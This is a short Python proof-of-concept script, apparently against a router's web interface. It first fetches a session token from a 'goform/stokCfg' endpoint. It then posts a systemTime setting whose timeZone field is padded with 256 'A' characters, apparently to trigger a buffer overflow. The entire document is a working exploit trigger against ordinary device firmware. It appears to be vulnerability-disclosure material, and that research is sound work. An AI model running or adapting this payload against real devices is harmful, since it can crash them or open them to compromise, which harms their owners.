import requests

url = "192.168.2.3"
port = 80

# Step1. get stok first
uri = "goform/stokCfg?rand=0.4545510260661747"
res = requests.get(f"http://{url}:{port}/{uri}")
print(f"res: {res.status_code}")
print(res.text)
stok = res.json()["stokCfg"]["stok"]


# Step2. send PoC payload
headers = {
        "Connection": "keep-alive",
        "Content-Type": "application/json",
        "Accept": "application/json, text/plain"
        }

data = {
        "systemTime": {
            "timeType": "sync",
            "timeZone": "20:00" + "A"*0x100,
            "summerTimeEn": 0,
            "startSummerTime": "2026-0-0-0 00:00",
            "endSummerTime": "2027-0-0-0 00:00",
            "time": "2025-11-4 00:00:00"
            },
        }

uri = "goform/setModules?modules=systemTime"
res = requests.post(f"http://{url}:{port}/;stok={stok}/{uri}", headers=headers, json=data)

print(f"res: {res.status_code}")
print(res.text)


